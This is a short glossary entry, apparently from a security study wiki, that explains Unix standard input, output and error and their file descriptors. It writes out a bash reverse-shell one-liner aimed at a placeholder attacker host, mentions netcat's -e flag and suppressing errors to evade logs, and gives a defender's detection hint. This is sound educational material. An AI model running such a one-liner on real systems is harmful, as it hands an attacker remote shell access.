# STDIO

## What it is
Think of a process like a person sitting at a desk with three slots in the wall: one for receiving letters (stdin), one for sending replies (stdout), and one for posting complaints (stderr). STDIO (Standard Input/Output) is the default communication interface every Unix/Linux process inherits at birth — file descriptors 0, 1, and 2 — through which data flows in and out without needing to know the underlying hardware.

## Why it matters
Attackers exploit STDIO redirection to create covert reverse shells. A classic one-liner like `bash -i >& /dev/tcp/attacker/4444 0>&1` redirects a shell's stdin, stdout, and stderr over a TCP socket — giving an attacker an interactive terminal with no additional binaries required. Defenders hunting for this look for processes with file descriptors pointing to network sockets instead of terminals.

## Key facts
- **File descriptor 0** = stdin (input), **1** = stdout (output), **2** = stderr (error messages); these are inherited by child processes
- STDIO-based shells are "living off the land" techniques — they abuse legitimate OS features, making them harder to detect with signature-based tools
- Netcat's `-e` flag pipes a shell's STDIO directly to a network connection, creating a bind or reverse shell
- Piping (`|`) chains processes by connecting stdout of one process to stdin of the next — attackers chain tools this way to avoid writing to disk
- Redirecting stderr to `/dev/null` (`2>/dev/null`) is a common attacker trick to suppress error output and avoid detection in logs

## Related concepts
[[Reverse Shell]] [[File Descriptors]] [[Living off the Land (LOtL)]] [[Netcat]] [[Command and Control (C2)]]